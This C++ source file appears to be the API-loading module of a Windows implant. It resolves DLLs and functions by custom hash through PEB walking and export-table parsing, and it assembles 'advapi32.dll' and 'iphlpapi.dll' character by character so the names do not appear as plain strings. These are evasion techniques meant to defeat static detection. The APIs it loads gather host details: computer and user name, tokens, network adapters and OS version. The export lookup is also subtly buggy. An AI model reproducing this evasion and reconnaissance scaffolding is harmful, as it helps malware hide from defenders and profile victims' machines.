#include "apidefs.hpp"
#include "common.hpp"
#include <stdio.h>





DWORD Hasher(PCHAR str) {
	DWORD h = 0x1231CBDE;
	DWORD MAGIC = 0xB33D33f;

	while (*str) {
		char c = *str++;
		h ^= (MAGIC ^ c);
		h = (h << 5) | (h >> 26);
		h += c * 16;
	}
	return h;
}

DWORD HasherW(PWSTR str) {
	DWORD h = 0x1231CBDE;
	DWORD MAGIC = 0xB33D33f;

	while (*str) {
		WCHAR c = *str++;
		h ^= (MAGIC ^ c);
		h = (h << 5) | (h >> 26);
		h += c * 16;
	}
	return h;
}


HMODULE GetModule(DWORD Hash) {
	PPEB peb = GetPEB();

	PEB_LDR_DATA* l = peb->Ldr;
	LIST_ENTRY* Modules = NULL;
	Modules = &l->InMemoryOrderModuleList;
	LIST_ENTRY* Start = Modules->Flink;

	for (LIST_ENTRY* List = Start; List != Modules; List = List->Flink) {
		LDR_DATA_TABLE_ENTRY* e = (LDR_DATA_TABLE_ENTRY*)((BYTE*)List - sizeof(LIST_ENTRY));
		if (HasherW(e->BaseDllName.Buffer) == Hash) {
			return (HMODULE)e->DllBase;
		}
	}
	return NULL;
}


FARPROC GetProc(HMODULE dll, DWORD hash) {
	PBYTE pBase = (PBYTE)dll;
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;

	if (pDos->e_magic != IMAGE_DOS_SIGNATURE) { return NULL; }
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
	if (pNt->Signature != IMAGE_NT_SIGNATURE) { return NULL; }

	PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD AddressFunc = (PDWORD)(pBase + pExportDir->AddressOfFunctions);
	PDWORD AddressName = (PDWORD)(pBase + pExportDir->AddressOfNames);
	PWORD AddressOrds = (PWORD)(pBase + pExportDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pExportDir->NumberOfFunctions; i++) {
		PCHAR funcName = (PCHAR)(pBase + AddressName[i]);
		DWORD HashedName = Hasher(funcName);
		if (HashedName == hash) {
			FARPROC addr = (FARPROC)(pBase + AddressFunc[AddressOrds[i]]);
			return addr;
		}
	}

}


BOOL LoadAPIS() {


	kModules->K32 = GetModule(HASHED_Kernel322);;
	if (kModules->K32) {
		WinApis->LoadLibraryA       = (decltype(WinApis->LoadLibraryA))       GetProc(kModules->K32, HASHED_LoadLibraryA);
		WinApis->GetComputerNameExA = (decltype(WinApis->GetComputerNameExA)) GetProc(kModules->K32, HASHED_GetComputerNameExA);
		WinApis->GetModuleFileNameA = (decltype(WinApis->GetModuleFileNameA)) GetProc(kModules->K32, HASHED_GetModuleFileNameA);
		WinApis->GetTickCount       = (decltype(WinApis->GetTickCount))       GetProc(kModules->K32, HASHED_GetTickCount);
		WinApis->CloseHandle        = (decltype(WinApis->CloseHandle))        GetProc(kModules->K32, HASHED_CloseHandle);
	}

	kModules->NTDLL = GetModule(HASHED_NTDLL);
	if (kModules->NTDLL) {
		WinApis->RtlGetVersion      = (decltype(WinApis->RtlGetVersion))      GetProc(kModules->NTDLL, HASHED_RtlGetVersion);
		WinApis->RtlRandomEx        = (decltype(WinApis->RtlRandomEx))        GetProc(kModules->NTDLL, HASHED_GenRandom);
		WinApis->NtOpenProcessToken = (decltype(WinApis->NtOpenProcessToken)) GetProc(kModules->NTDLL, HASHED_OpenProcessToken);
		WinApis->NtOpenThreadToken  = (decltype(WinApis->NtOpenThreadToken))  GetProc(kModules->NTDLL, HASHED_OpenThreadToken);
	}
	

	char buf[13];
	buf[0] = 'a';
	buf[1] = 'd';
	buf[2] = 'v';
	buf[3] = 'a';
	buf[4] = 'p';
	buf[5] = 'i';
	buf[6] = '3';
	buf[7] = '2';
	buf[8] = '.';
	buf[9] = 'd';
	buf[10] = 'l';
	buf[11] = 'l';
	buf[12] = '\0';
	kModules->ADVAPI32 = WinApis->LoadLibraryA(buf);

	if (kModules->ADVAPI32) {
		WinApis->GetUserNameA = (decltype(WinApis->GetUserNameA))GetProc(kModules->ADVAPI32, HASHED_GetUserNameA);
		WinApis->GetTokenInformation = (decltype(WinApis->GetTokenInformation))GetProc(kModules->ADVAPI32, HASHED_GetTokenInformation);

	}



	char buf2[13];
	buf2[0]  = 'i';
	buf2[1]  = 'p';
	buf2[2]  = 'h';
	buf2[3]  = 'l';
	buf2[4]  = 'p';
	buf2[5]  = 'a';
	buf2[6]  = 'p';
	buf2[7]  = 'i';
	buf2[8]  = '.';
	buf2[9]  = 'd';
	buf2[10] = 'l';
	buf2[11] = 'l';
	buf2[12] = '\0';
	kModules->IPHLPAPI = WinApis->LoadLibraryA(buf2);

	if (kModules->IPHLPAPI) {
		WinApis->GetAdaptersInfo = (decltype(WinApis->GetAdaptersInfo))GetProc(kModules->IPHLPAPI, HASHED_GetAdaptersInfo);

	}



	return TRUE;





}